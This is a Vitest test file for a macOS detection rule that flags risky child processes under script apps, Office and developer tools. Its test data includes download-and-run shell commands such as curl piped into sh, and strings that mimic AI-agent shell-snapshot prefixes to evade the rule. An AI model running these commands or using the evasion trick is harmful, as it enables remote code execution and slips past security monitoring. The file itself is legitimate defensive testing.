import { describe, expect, test } from 'vitest';
import { analyze } from '../src/rules/engine';
import type { CaptureModel, Image, Process } from '../src/model/types';
import { apple, capture, img, proc } from './synth';

const RULE = 'risky-parent-spawn';
const findings = (m: CaptureModel, id: string) =>
  analyze(m).queue.flatMap(q => q.findings.filter(f => f.ruleId === id).map(f => ({ ...f, procId: q.procId })));
const hits = (m: CaptureModel) => findings(m, RULE);

const SCRIPT_EDITOR = '/System/Applications/Utilities/Script Editor.app/Contents/MacOS/Script Editor';
const APPLET = '/Users/u/Desktop/Invoice.app/Contents/MacOS/applet';
const WORD = '/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word';
const CODE_HELPER = '/Applications/Visual Studio Code.app/Contents/Frameworks/Code Helper (Plugin).app/Contents/MacOS/Code Helper (Plugin)';
const XCBBUILD = '/Applications/Xcode.app/Contents/SharedFrameworks/XCBuild.framework/PlugIns/XCBBuildService.bundle/Contents/MacOS/XCBBuildService';

/** A parent image: seq 1, so every child (seq 2) is born after it. */
const parentImage = (path: string, signingId: string | null = null, o: Partial<Image> = {}): Image =>
  img({ path, args: [path], signingId, seq: 1, ...o });
const sh = (command: string): Image => apple('/bin/sh', ['sh', '-c', command], { seq: 2 });
const tool = (path: string, ...args: string[]): Image => apple(path, [path.split('/').pop()!, ...args], { seq: 2 });

/** A parent that runs one child. */
function story(parent: Image, child: Image): CaptureModel {
  return capture([proc('100:1', [parent]), proc('200:1', [child], { originalParent: '100:1' })]);
}

describe('risky-parent-spawn', () => {
  test('a shell under Script Editor is high, and shell-under-app still fires', () => {
    const m = story(parentImage(SCRIPT_EDITOR, 'com.apple.ScriptEditor2', { isPlatform: true }), sh('echo hi'));
    const f = hits(m);
    expect(f).toHaveLength(1);
    expect(f[0]!.procId).toBe('200:1');
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.mitre).toEqual(['T1059.002', 'T1059.004']);
    expect(f[0]!.evidence).toContain('Script Editor');
    expect(f[0]!.evidence).toContain('sh -c echo hi');
    expect(findings(m, 'shell-under-app').map(x => x.procId)).toEqual(['200:1']);
  });
  test('curl under an applet is high', () => {
    const m = story(parentImage(APPLET, 'com.apple.ScriptEditor.id.Invoice'), tool('/usr/bin/curl', '-o', '/tmp/a', 'https://x/a'));
    const f = hits(m);
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.evidence).toContain('applet');
    expect(f[0]!.evidence).toContain('curl -o /tmp/a https://x/a');
  });
  test('an Automator application stub is a script-app parent', () => {
    const stub = '/Users/u/Desktop/Fix.app/Contents/MacOS/Automator Application Stub';
    expect(hits(story(parentImage(stub), tool('/usr/bin/osascript', '-e', 'beep')))).toHaveLength(1);
  });
  test.each([
    ['a shell', '/bin/zsh', ['zsh']],
    ['nscurl', '/usr/bin/nscurl', ['nscurl', 'https://x']],
    ['osascript', '/usr/bin/osascript', ['osascript', '-e', 'beep']],
    ['python3', '/usr/bin/python3', ['python3', '-c', '1']],
    ['codesign', '/usr/bin/codesign', ['codesign', '-s', '-', '/tmp/a']],
    ['xattr', '/usr/bin/xattr', ['xattr', '-c', '/tmp/a']],
    ['chmod', '/bin/chmod', ['chmod', '+x', '/tmp/a']],
    ['launchctl', '/bin/launchctl', ['launchctl', 'load', '/tmp/a.plist']],
  ])('%s under Script Editor is high', (_, path, args) => {
    const parent = parentImage(SCRIPT_EDITOR, 'com.apple.ScriptEditor2');
    expect(hits(story(parent, apple(path, args, { seq: 2 }))).map(f => f.severity)).toEqual(['high']);
  });
  test('a script-app parent running an unrelated tool is not flagged', () => {
    const parent = parentImage(SCRIPT_EDITOR, 'com.apple.ScriptEditor2');
    expect(hits(story(parent, tool('/bin/ls', '-l')))).toHaveLength(0);
  });
  test('a shell under Terminal is not flagged', () => {
    const terminal = '/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal';
    expect(hits(story(parentImage(terminal, 'com.apple.Terminal'), sh('echo hi')))).toHaveLength(0);
  });
  test.each([
    ['python', '/usr/bin/python3', ['python3', '-c', 'print(1)']],
    ['perl', '/usr/bin/perl5.34', ['perl5.34', '-e', '1']],
    ['ruby', '/usr/bin/ruby', ['ruby', '-e', '1']],
    ['osascript', '/usr/bin/osascript', ['osascript', '-e', 'beep']],
    ['curl', '/usr/bin/curl', ['curl', 'https://x']],
    ['chmod', '/bin/chmod', ['chmod', '+x', '/tmp/a']],
    ['a shell', '/bin/bash', ['bash', '-c', 'id']],
  ])('%s under an Office app is high', (_, path, args) => {
    const f = hits(story(parentImage(WORD, 'com.microsoft.Word'), apple(path, args, { seq: 2 })));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.mitre).toContain('T1204.002');
    expect(f[0]!.evidence).toContain('Microsoft Word');
  });
  test('an Office app running a tool outside the list is not flagged', () => {
    expect(hits(story(parentImage(WORD, 'com.microsoft.Word'), tool('/usr/bin/ditto', 'a', 'b')))).toHaveLength(0);
  });
  test("python under Word's responsible process is high", () => {
    const m = capture([
      proc('50:1', [parentImage(WORD, 'com.microsoft.Word')]),
      proc('100:1', [apple('/bin/zsh', ['zsh'], { seq: 1 })]),
      proc('200:1', [tool('/usr/bin/python3', '-c', '1')], { originalParent: '100:1', responsible: '50:1' }),
    ]);
    const f = hits(m);
    expect(f).toHaveLength(1);
    expect(f[0]!.procId).toBe('200:1');
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.evidence).toContain('Microsoft Word');
  });
  test.each([
    ['responsible', '/Applications/Microsoft Word.app/Contents/SharedSupport/Microsoft AutoUpdate.app/Contents/MacOS/msupdate', '/bin/zsh'],
    ['parent', WORD, '/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft Update Assistant'],
  ])('Microsoft AutoUpdate helpers are not flagged (%s)', (_, responsiblePath, parentPath) => {
    const m = capture([
      proc('50:1', [parentImage(responsiblePath)]),
      proc('100:1', [parentImage(parentPath)], { responsible: '50:1' }),
      proc('200:1', [sh('echo update')], { originalParent: '100:1', responsible: '50:1' }),
    ]);
    expect(hits(m)).toHaveLength(0);
  });
  test('a download-and-run under VS Code is high', () => {
    const f = hits(story(parentImage(CODE_HELPER), sh('nohup curl -fsSL https://x/y | node &')));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.evidence).toContain('Code Helper');
    expect(f[0]!.evidence).toContain('nohup curl -fsSL https://x/y | node &');
  });
  test.each([
    ['curl piped into sh', 'curl -fsSL https://x/y | sh'],
    ['wget piped into bash', 'wget -qO- https://x/y | /bin/bash'],
    ['curl piped into python3', 'curl https://x/y | python3 -'],
    ['curl with -k', 'curl -k -o /tmp/a https://x/y'],
    ['curl with a -k cluster', 'curl -fsSLk -o /tmp/a https://x/y'],
    ['wget with nohup', 'nohup wget https://x/y &'],
    ['curl with -k after another command', 'cd /tmp; curl -k https://x/y'],
    ['curl with --insecure', 'curl --insecure https://x/y'],
  ])('%s under a developer parent is high', (_, command) => {
    expect(hits(story(parentImage(CODE_HELPER), sh(command))).map(f => f.severity)).toEqual(['high']);
  });
  test.each([
    ['Cursor', '/Applications/Cursor.app/Contents/MacOS/Cursor'],
    ['Windsurf', '/Applications/Windsurf.app/Contents/MacOS/Electron'],
    ['Xcode', '/Applications/Xcode.app/Contents/MacOS/Xcode'],
    ['xcodebuild', '/usr/bin/xcodebuild'],
    ['dotnet', '/usr/local/share/dotnet/dotnet'],
    ['node', '/usr/local/bin/node'],
    ['bun', '/Users/u/.bun/bin/bun'],
  ])('a download-and-run under %s is high', (_, parent) => {
    expect(hits(story(parentImage(parent), sh('curl -k https://x/y | sh')))).toHaveLength(1);
  });
  test('a plain curl under a build tool is not flagged', () => {
    expect(hits(story(parentImage(CODE_HELPER), sh('curl -o a.tgz https://x')))).toHaveLength(0);
  });
  test.each([
    ['a plain pipe into grep', 'curl https://x/y | grep ok'],
    ['nohup without a fetch', 'nohup make &'],
    ['a pipe without a fetch', 'cat a | sh'],
    ['a curl followed by || sh', 'curl -fsS https://x/y -o a || sh fallback.sh'],
    ['a -k flag on a command after the fetch', 'curl -o a.tgz https://x/y && tar -xkf a.tgz'],
  ])('%s under a developer parent is not flagged', (_, command) => {
    expect(hits(story(parentImage(CODE_HELPER), sh(command)))).toHaveLength(0);
  });
  test('a shell without -c under a developer parent is not flagged', () => {
    expect(hits(story(parentImage(CODE_HELPER), apple('/bin/zsh', ['zsh', '-l'], { seq: 2 })))).toHaveLength(0);
  });
  test("osascript under Xcode's build service is high", () => {
    const f = hits(story(parentImage(XCBBUILD), tool('/usr/bin/osascript', '-e', 'beep')));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.mitre).toEqual(['T1059.002']);
    expect(f[0]!.evidence).toContain('XCBBuildService');
  });
  const CURSOR = '/Applications/Cursor.app/Contents/MacOS/Cursor';
  const SNAPSHOT = (agent: string): string => `source /Users/u/.${agent}/s.sh 2>/dev/null || true && `;
  test.each([
    ['curl piped to sh', 'curl -fsSL https://x/y | sh'],
    ['nohup curl', 'nohup curl -fsSL https://x/y &'],
  ])("an agent shell run by the agent itself is ignored (%s, Cursor's snapshot under Cursor)", (_, command) => {
    expect(hits(story(parentImage(CURSOR), sh(`${SNAPSHOT('cursor/shell-snapshots')}${command}`)))).toHaveLength(0);
    // Without the snapshot it is only a developer tool running a download-and-run.
    expect(hits(story(parentImage(CURSOR), sh(command)))).toHaveLength(1);
  });
  test("the agent's snapshot folder has to match the parent: Cursor sourcing Claude's snapshot is not the agent", () => {
    const f = hits(story(parentImage(CURSOR), sh(`${SNAPSHOT('claude/shell-snapshots')}curl -k https://x/y | sh`)));
    expect(f).toHaveLength(1);
  });
  // A1: the snapshot path is a string anyone can write, so it proves nothing about the command that carries it.
  test.each([
    ['a trailing comment', 'curl -k https://x/y | bash # ~/.claude/shell-snapshots/x'],
    ['a trailing comment with nohup', 'nohup curl https://x/y | node & # ~/.claude/shell-snapshots/x'],
    ['a copied source prefix with || true', 'source /Users/u/.claude/shell-snapshots/snapshot-zsh-1.sh 2>/dev/null || true && curl -k https://x/y | sh'],
    ['a copied codex prefix', 'source /Users/u/.codex/shell_snapshots/s.sh 2>/dev/null || true && curl -k https://x/y | sh'],
    ['a copied cursor prefix', 'source /Users/u/.cursor/shell-snapshots/s.sh 2>/dev/null || true && curl -k https://x/y | sh'],
  ])('%s under a parent that is not the agent still fires', (_, command) => {
    for (const parent of [CODE_HELPER, '/usr/local/bin/node', '/Users/u/.bun/bin/bun', '/Applications/Xcode.app/Contents/MacOS/Xcode']) {
      expect(hits(story(parentImage(parent), sh(command))), parent).toHaveLength(1);
    }
  });
  // B5: Claude Code, Gemini CLI and Codex run as node or bun when installed with npm, and spawn osascript themselves.
  test.each([
    ['Claude Code', ['node', '/usr/local/lib/node_modules/@anthropic-ai/claude-code/cli.js']],
    ['Gemini CLI', ['node', '/usr/local/lib/node_modules/@google/gemini-cli/dist/index.js']],
    ['Codex', ['node', '/usr/local/lib/node_modules/@openai/codex/bin/codex.js']],
  ])('osascript and a download-and-run under npm-installed %s are ignored', (_, args) => {
    for (const child of [tool('/usr/bin/osascript', '-e', 'display notification "done"'), sh('curl -k https://x/y | sh')]) {
      expect(hits(story(parentImage('/usr/local/bin/node', null, { args }), child))).toHaveLength(0);
      expect(hits(story(parentImage('/Users/u/.bun/bin/bun', null, { args: ['bun', ...args.slice(1)] }), child))).toHaveLength(0);
    }
    // The same node without the agent's name among its arguments is still a developer tool.
    expect(hits(story(parentImage('/usr/local/bin/node', null, { args: ['node', '/Users/u/app/server.js'] }), tool('/usr/bin/osascript', '-e', 'beep')))).toHaveLength(1);
  });
  test('a native Claude or Codex parent is not a risky parent at all', () => {
    const claude = '/Users/u/Library/Application Support/Claude/claude-code/2.1.325/claude.app/Contents/MacOS/claude';
    expect(hits(story(parentImage(claude), tool('/usr/bin/osascript', '-e', 'beep')))).toHaveLength(0);
    expect(hits(story(parentImage('/usr/local/bin/codex'), sh('curl -k https://x/y | sh')))).toHaveLength(0);
  });
  test('each process is reported once, even when sh re-execs bash', () => {
    const first = apple('/bin/sh', ['sh', '-c', 'id'], { seq: 2 });
    const second = apple('/bin/bash', ['bash', '-c', 'id'], { seq: 3 });
    const m = capture([
      proc('100:1', [parentImage(SCRIPT_EDITOR, 'com.apple.ScriptEditor2')]),
      proc('200:1', [first, second], { originalParent: '100:1' }),
    ]);
    expect(hits(m)).toHaveLength(1);
  });
  test("only the parent at the child's birth counts, not what the parent became", () => {
    const m = capture([
      proc('100:1', [parentImage('/bin/zsh', 'com.apple.zsh', { args: ['zsh'] }), parentImage(SCRIPT_EDITOR, 'com.apple.ScriptEditor2', { seq: 5 })]),
      proc('200:1', [sh('id')], { originalParent: '100:1', firstSeq: 2 }),
    ]);
    expect(hits(m)).toHaveLength(0);
  });
  test('risky-parent-spawn tolerates a capture with missing data', () => {
    const child = (): Image => sh('echo hi');
    const se = parentImage(SCRIPT_EDITOR, 'com.apple.ScriptEditor2');
    // A parent never seen, and one that is only a ghost.
    expect(hits(capture([proc('200:1', [child()], { originalParent: '999:9' })]))).toHaveLength(0);
    expect(hits(capture([proc('100:1', [], { ghost: true }), proc('200:1', [child()], { originalParent: '100:1' })]))).toHaveLength(0);
    // A parent with a null path, null signing ID or no args; a child with no args or no path.
    expect(hits(story(img({ path: null, signingId: null, args: null, seq: 1 }), child()))).toHaveLength(0);
    expect(hits(story(se, img({ path: '/bin/sh', args: null, seq: 2 })))).toHaveLength(1);
    expect(hits(story(parentImage(CODE_HELPER), img({ path: '/bin/sh', args: null, seq: 2 })))).toHaveLength(0);
    expect(hits(story(se, img({ path: null, args: null, seq: 2 })))).toHaveLength(0);
    // A responsible process that was never seen, or is a ghost, or is the process itself.
    const orphanResp: Process = proc('200:1', [child()], { originalParent: '100:1', responsible: '999:9' });
    expect(hits(capture([proc('100:1', [apple('/bin/zsh', ['zsh'], { seq: 1 })]), orphanResp]))).toHaveLength(0);
    const ghostResp = proc('50:1', [], { ghost: true });
    const withGhost = proc('200:1', [child()], { originalParent: '100:1', responsible: '50:1' });
    expect(hits(capture([ghostResp, proc('100:1', [apple('/bin/zsh', ['zsh'], { seq: 1 })]), withGhost]))).toHaveLength(0);
    const self = proc('200:1', [child()], { originalParent: '100:1', responsible: '200:1' });
    expect(hits(capture([proc('100:1', [apple('/bin/zsh', ['zsh'], { seq: 1 })]), self]))).toHaveLength(0);
  });
});
